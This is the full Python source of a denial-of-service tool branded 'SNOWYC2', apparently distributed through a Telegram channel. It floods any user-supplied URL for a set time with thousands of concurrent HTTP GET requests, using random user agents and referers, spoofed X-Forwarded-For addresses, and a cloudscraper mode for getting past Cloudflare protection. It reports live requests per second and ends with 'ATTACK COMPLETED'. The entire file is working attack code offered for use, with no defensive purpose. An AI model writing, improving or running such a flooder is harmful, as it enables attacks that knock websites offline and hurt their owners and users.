import asyncio
import aiohttp
import cloudscraper
import random
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# User Configs
MAX_CONCURRENT_C_ECLIPSE = 4000
MAX_CONCURRENT_CC_ECLIPSE = 100
REQUEST_TIMEOUT_C = 10
REQUEST_TIMEOUT_CC = 20

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)..."
]

REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/",
    "https://www.youtube.com/", "https://www.reddit.com/",
    "https://www.instagram.com/", "https://www.tiktok.com/"
]

VALID_METHODS = ["C-ECLIPSE", "CC-ECLIPSE"]

class CEclipse:
    def __init__(self, target, duration):
        self.target = target
        self.time = duration
        self.start_time = 0
        self.stats = {
            'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0
        }
        self.semaphore = asyncio.Semaphore(1000)

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        async with self.semaphore:
            try:
                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT_C) as response:
                    if response.status == 200:
                        return "SUCCESS"
                    elif str(response.status).startswith("4"):
                        return "ERROR"
                    return "OTHER"
            except:
                return "ERROR"

    async def run(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            while time.time() < end_time:
                tasks = [asyncio.create_task(self.make_request(session)) for _ in range(MAX_CONCURRENT_C_ECLIPSE)]
                results = await asyncio.gather(*tasks)
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                elapsed = time.time() - self.start_time
                rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
                self.print_status()

    def print_status(self):
        elapsed = time.time() - self.start_time
        left = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM | METHOD: C-ECLIPSE")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" TIME LEFT: {left:.1f}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print("=" * 60)


class CCEclipse:
    def __init__(self, target, duration):
        self.target = target
        self.time = duration
        self.stats = {'total': 0, 'success': 0, 'errors': 0}
        self.start_time = 0
        self.executor = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CC_ECLIPSE)

    def make_request(self):
        scraper = cloudscraper.create_scraper(delay=1, browser={'custom': 'ScraperBot'})
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS)
        }
        try:
            resp = scraper.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT_CC)
            if resp.status_code == 200:
                return "SUCCESS"
            elif str(resp.status_code).startswith("4"):
                return "ERROR"
            return "OTHER"
        except:
            return "ERROR"

    def run(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time
        loop = asyncio.get_event_loop()

        async def run_threaded():
            while time.time() < end_time:
                tasks = [loop.run_in_executor(self.executor, self.make_request) for _ in range(MAX_CONCURRENT_CC_ECLIPSE)]
                results = await asyncio.gather(*tasks)
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                self.print_status()
                await asyncio.sleep(0.3)

        loop.run_until_complete(run_threaded())
        self.executor.shutdown()

    def print_status(self):
        elapsed = time.time() - self.start_time
        left = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM | METHOD: CC-ECLIPSE")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" TIME LEFT: {left:.1f}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 40)

    method = input("METHOD: ").strip().upper()
    if method not in VALID_METHODS:
        print("Invalid method.")
        return

    target = input("TARGET URL: ").strip()
    duration = int(input("TIME (seconds): ").strip())
    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"

    try:
        if method == "C-ECLIPSE":
            engine = CEclipse(target, duration)
            asyncio.run(engine.run())
        elif method == "CC-ECLIPSE":
            engine = CCEclipse(target, duration)
            engine.run()
        print("\nATTACK COMPLETED")
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
